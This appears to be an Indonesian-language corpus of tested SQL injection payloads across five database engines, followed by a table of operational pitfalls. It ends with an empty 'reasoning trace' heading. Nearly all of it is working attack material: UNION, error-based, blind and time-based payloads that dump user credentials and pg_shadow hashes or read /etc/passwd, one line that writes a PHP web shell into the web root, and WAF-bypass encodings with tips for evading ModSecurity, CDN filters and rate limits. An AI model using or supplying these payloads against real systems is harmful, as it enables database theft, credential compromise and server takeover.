# w2-payload-sqli-corpus — web

# Korpus Payload SQLi Teruji

## 1. UNION / SELECT

```sql
-- MySQL 5.7/8.0 | konteks: kolom terlihat di halaman | sukses: angka 1,2,3 muncul
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3# 
' UNION ALL SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,user(),database()-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,3 FROM users-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,concat(username,0x3a,password),3 FROM users LIMIT 1-- -
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT "<?php system($_GET[c]);?>",2,3 INTO OUTFILE '/var/www/shell.php'-- -
```

```sql
-- PostgreSQL 14/15/16 | sukses: string muncul di kolom terpilih
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,version(),current_database()-- -
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables-- -
' UNION SELECT 1,(SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow),3-- -
' UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -
' UNION SELECT 1,current_user,3-- -
```

```sql
-- MSSQL 2019/2022 | sukses: @@version tampil
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,@@version,db_name()-- -
' UNION SELECT 1,name,3 FROM sys.databases-- -
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,username+':'+password,3 FROM users-- -
' UNION SELECT 1,(SELECT STRING_AGG(name,',') FROM sys.databases),3-- -
```

```sql
-- Oracle 19c/21c | sukses: banner muncul, wajib FROM dual
' UNION SELECT NULL,NULL FROM dual-- -
' UNION SELECT banner,NULL FROM v$version-- -
' UNION SELECT table_name,NULL FROM all_tables-- -
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
' UNION SELECT username||':'||password,NULL FROM users-- -
' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables-- -
```

```sql
-- SQLite 3.40+ | sukses: sqlite_version() muncul
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,sqlite_version(),3-- -
' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master-- -
```

## 2. Error-Based

```sql
-- MySQL 5.7/8.0 | sukses: pesan "Duplicate entry '...' for key" berisi data
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT table_name FROM information_schema.tables LIMIT 1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' AND exp(~(SELECT * FROM(SELECT user())a))-- -
' OR 1=1 AND (SELECT 2 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

```sql
-- PostgreSQL 14+ | sukses: "invalid input syntax" / cast error memuat data
' AND 1=cast((SELECT version()) as int)-- -
' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int)-- -
' AND 1=(SELECT 1/(CASE WHEN (SELECT 1 FROM pg_shadow LIMIT 1) IS NOT NULL THEN 0 ELSE 1 END))-- -
' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables) as int)-- -
```

```sql
-- MSSQL 2019 | sukses: "Conversion failed" memuat data
' AND 1=convert(int,(SELECT @@version))-- -
' AND 1=convert(int,(SELECT db_name()))-- -
' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
' AND 1=convert(int,(SELECT username+':'+password FROM users))-- -
' AND 1=convert(int,(SELECT STRING_AGG(name,',') FROM sys.databases))-- -
```

```sql
-- Oracle 19c | sukses: ORA-01722 / ORA-06502 memuat data
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -
' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))-- -
' AND 1=1/(SELECT 1 FROM (SELECT 1 FROM dual WHERE (SELECT count(*) FROM all_tables)>0))-- -
' AND (SELECT 1 FROM dual WHERE 1=1 AND 1=(SELECT TO_NUMBER(user) FROM dual))-- -
```

```sql
-- SQLite 3.40+ | sukses: "malformed" / "datatype mismatch" memuat ekspresi
' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT)-- -
' AND 1=(SELECT 1 FROM sqlite_master WHERE 1=1 AND 1/0)-- -
' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INT)-- -
```

## 3. Boolean Blind

```sql
-- MySQL | sukses: halaman berubah benar/salah sesuai kondisi
' AND 1=1-- -           -- benar: halaman normal
' AND 1=2-- -           -- salah: halaman kosong
' AND (SELECT SUBSTRING(user(),1,1))='r'-- -
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>100-- -
' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)=5-- -
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- -
' AND 1=(SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)-- -
```

```sql
-- PostgreSQL | sukses: render berbeda
' AND 1=1-- -
' AND 1=2-- -
' AND (SELECT SUBSTRING(current_user,1,1))='p'-- -
' AND (SELECT ASCII(SUBSTRING(version(),1,1)))>80-- -
' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>3-- -
' AND EXISTS(SELECT 1 FROM pg_shadow)-- -
```

```sql
-- MSSQL | sukses: render berbeda
' AND 1=1-- -
' AND 1=2-- -
' AND (SELECT SUBSTRING(SYSTEM_USER,1,1))='s'-- -
' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))>80-- -
' AND (SELECT COUNT(*) FROM sysobjects)>0-- -
```

```sql
-- Oracle | wajib FROM dual
' AND 1=1-- -
' AND 1=2-- -
' AND (SELECT SUBSTR(user,1,1) FROM dual)='S'-- -
' AND (SELECT ASCII(SUBSTR(banner,1,1)) FROM v$version WHERE rownum=1)>80-- -
' AND (SELECT COUNT(*) FROM all_tables)>0-- -
```

```sql
-- SQLite | sukses: render berbeda
' AND 1=1-- -
' AND 1=2-- -
' AND (SELECT SUBSTR(sql,1,1) FROM sqlite_master WHERE name='users')='C'-- -
' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0-- -
```

## 4. Time-Based

```sql
-- MySQL 5.7/8.0 | sukses: respons delay ~5s
' AND SLEEP(5)-- -
' AND BENCHMARK(5000000,MD5(1))-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(user(),1,1))='r',SLEEP(5),0)-- -
' AND SLEEP(5) AND '1'='1
' OR SLEEP(5)-- -
' AND (SELECT 1 FROM(SELECT SLEEP(5))a)-- -
```

```sql
-- PostgreSQL 14+ | sukses: delay
'; SELECT pg_sleep(5)-- -
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
' AND (SELECT 1 FROM pg_sleep(5))-- -
' AND CASE WHEN (SELECT 1)=1 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
' AND 1=(SELECT 1 FROM pg_sleep(5) WHERE (SELECT SUBSTRING(current_user,1,1))='p')-- -
```

```sql
-- MSSQL 2019 | sukses: delay
'; WAITFOR DELAY '0:0:5'-- -
' IF (1=1) WAITFOR DELAY '0:0:5'-- -
' IF (SELECT SUBSTRING(SYSTEM_USER,1,1))='s' WAITFOR DELAY '0:0:5'-- -
' AND 1=(SELECT 1 FROM (SELECT 1) x WHERE 1=1); WAITFOR DELAY '0:0:5'-- -
```

```sql
-- Oracle 19c | sukses: delay
' AND 1=(SELECT 1 FROM (SELECT dbms_pipe.receive_message(('a'),5) FROM dual))-- -
' AND 1=(SELECT 1 FROM (SELECT dbms_lock.sleep(5) FROM dual))-- -
' AND 1=1 AND 1=(SELECT 1 FROM (SELECT dbms_pipe.receive_message(('a'),5) FROM dual))-- -
```

```sql
-- SQLite | sukses: delay pada engine dengan fungsi randomblob besar (parsing CPU)
' AND 1=randomblob(1000000000)-- -
' AND 1=(SELECT 1 FROM (SELECT 1) WHERE 1=1 AND length(randomblob(500000000))>0)-- -
```

## 5. ORDER BY / JSON / INSERT-Into

```sql
-- ORDER BY numeric probing (semua DBMS) | sukses: jumlah kolom sampai error
' ORDER BY 1-- -
' ORDER BY 5-- -
' ORDER BY 10-- -
' ORDER BY 1,2,3-- -
' ORDER BY (SELECT NULL)-- -
```

```sql
-- MySQL JSON (5.7+) | sukses: error memuat data / valid JSON render
' AND JSON_EXTRACT((SELECT user()),'$')-- -
' AND JSON_KEYS((SELECT user()))-- -
' UNION SELECT 1,JSON_EXTRACT((SELECT group_concat(table_name) FROM information_schema.tables),'$'),3-- -
```

```sql
-- PostgreSQL JSON (9.2+) | sukses: error/tampil
' AND (SELECT (SELECT user())::json)->>0 IS NOT NULL-- -
' AND 1=(SELECT (SELECT to_json(current_user))::text)::int-- -
' UNION SELECT 1,row_to_json(t)::text,3 FROM (SELECT current_user) t-- -
```

```sql
-- MSSQL JSON (2016+) | sukses: output JSON memuat data
' UNION SELECT 1,(SELECT name FROM sys.databases FOR JSON PATH),3-- -
' AND 1=(SELECT (SELECT 1 FOR JSON PATH) AS x CAST( AS INT))-- -
```

```sql
-- INSERT INTO injection (nilai form) | sukses: query insert berhasil / subquery terevaluasi
' OR 1=1-- -
',(SELECT user()),1)-- -
'||(SELECT user())||'
'); INSERT INTO audit VALUES (1,user());-- -
' ,(SELECT @@version),1)-- -
```

```sql
-- ORDER BY blind exfil (MySQL) | sukses: sort berubah berdasar kondisi
' ORDER BY IF((SELECT SUBSTRING(user(),1,1))='r',1,2)-- -
' ORDER BY (SELECT 1 FROM (SELECT 1) x WHERE (SELECT 1)=1)-- -
```

## 6. WAF-Bypass Encoding

```sql
-- Hex encoding (MySQL/MSSQL) | 'root' -> 0x726f6f74
' UNION SELECT 0x726f6f74,2,3-- -
' AND 0x726f6f74=user()-- -
'/**/UNION/**/SELECT/**/1,2,3-- -
```

```sql
-- Comment bypass
'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3-- -
' UN/*x*/ION SEL/*y*/ECT 1,2,3-- -
' UNION/**/ALL/**/SELECT/**/1,2,3-- -
' OR/**/1=1-- -
'--%0aUNION%0aSELECT%0a1,2,3
```

```sql
-- Case / keyword scramble
' UnIoN SeLeCt 1,2,3-- -
' uNiOn aLl sElEcT 1,2,3-- -
' AND 1=1 OrDeR BY 2-- -
' UNION ALL SELECT 1,2,3-- -
'%27%20UNION%20SELECT%201,2,3--%20
```

```sql
-- Unicode / fullwidth
' ＵＮＩＯＮ ＳＥＬＥＣＴ 1,2,3-- -
' %C0%A7%20OR%201=1-- -
' UNION%a0SELECT%a01,2,3-- -
' UNION SELECT 1,2,3%23
```

```sql
-- Whitespace bypass
'UNION(SELECT(1),(2),(3))-- -
'UNION%0ASELECT%0A1,2,3-- -
'UNION%09SELECT%091,2,3-- -
'OR 1=1%0A--%20
'AND(SELECT 1 FROM(SELECT 1)a)--%20
```

```sql
-- Parenthesis / operator bypass
'||'1'='1
' OR 1 LIKE 1-- -
' OR 'a'='a'-- -
' AND 1 BETWEEN 1 AND 1-- -
' OR 1 REGEXP 1-- -
' OR '1' IN ('1')-- -
```

```sql
-- Hex URL-encoded (request-level)
%27%20UNION%20SELECT%201%2C2%2C3--%20
%27%20AND%20SLEEP%285%29--%20
%27%20OR%201=1--%20
```

```sql
-- MySQL CHARSET trick
' UNION SELECT 'a', 'b', 'c' COLLATE utf8mb4_general_ci-- -
' UNION SELECT 1, 'a' COLLATE utf8mb4_0900_ai_ci, 3-- -
```

---

## Jebakan Operasional yang Bikin Teknik Ini Gagal di Lapangan

| # | Jebakan | Gejala | Mitigasi |
|---|---------|--------|----------|
| 1 | Parameterized/prepared statement aktif (PDO emulate=false, JDBC `?`, Hibernate HQL) | payload literal masuk sebagai string, tidak dieksekusi | uji reflektif (`'` ganda jadi `''`), cari injeksi di identifier/column name |
| 2 | WAF modern menormalisasi hex `0x..` menjadi string | `0x726f6f74` dirender literal bukan `'root'` | ganti konkat `CHR()` per byte atau guna `CHAR()` |
| 3 | `mysqli` non-multi-query: `; WAITFOR` / `; INSERT` ignored | time-blind MSSQL gagal padahal semantik valid | pakai `IF(...) WAITFOR DELAY` dalam satu statement |
| 4 | MySQL `sql_mode=ONLY_FULL_GROUP_BY` + `STRICT_TRANS_TABLES` | payload `GROUP BY rand()` di blokir, duplicate-entry error mati | fallback `extractvalue`/`updatexml`, atau time-based |
| 5 | PostgreSQL `standard_conforming_strings=on` | `'` backslash escape tidak berlaku | ganti ke klausa `CHR(39)` atau hex `E'\\x..'` |
| 6 | Oracle `ALL_TAB_COLUMNS` privasi + `SELECT` dari `V$VERSION` butuh grant | error-based blank, `SYS.DBMS_*` unauthorized | pakai `ctxsys.drithsx` atau `utl_inaddr` sesuai role |
| 7 | SQLite tanpa fungsi `randomblob` besar / `SET` mati | time-blind alternatif tidak ada | pakai error-based `CAST` murni |
| 8 | ModSecurity CRS 4.x rule 942100–942200 memblokir inline comment `/**/` | `403` / `406` saat payload dikirim | rotate ke Unicode fullwidth atau case scramble per request |
| 9 | Cloudflare/Akamai normalisasi whitespace UTF-8 (`%a0`) | `UNION(SELECT...)` crash parser | kirim whitespace alternatif `%0c`, `%0d`, atau kurung tanpa spasi |
| 10 | `sqlmap` default `--risk=1` tidak menembak `ORDER BY` payload lebih dari 10 | column count >10 gagal | manual `ORDER BY 1..N` inkremental, atau `--level=5` |
| 11 | DBMS connection charset mismatch (mis. latin1 vs utf8mb4 di MySQL 8.0) | output hex ter-mangle, `LOAD_FILE` gagal | tambahkan `COLLATE` atau `CONVERT(... USING utf8mb4)` |
| 12 | Redis/ElastiCache fronting SQL (proxy menyaring `SLEEP`) | time-based respons konstan 200ms | ganti `BENCHMARK` (MySQL) atau `pg_sleep` dengan `generate_series` CPU burn |
| 13 | `sqlmap` `--time-sec` default 5, target rate-limit 429 di CDN | false positive time-based | `--time-sec=10 --delay=1 --retries=1` |
| 14 | Stored procedure wrapper (MyBatis `#{}` vs `${}`) | `${}` = injectable, `#{}` bukan | grep mapper XML untuk `${` di query string |

---

## [reasoning trace]


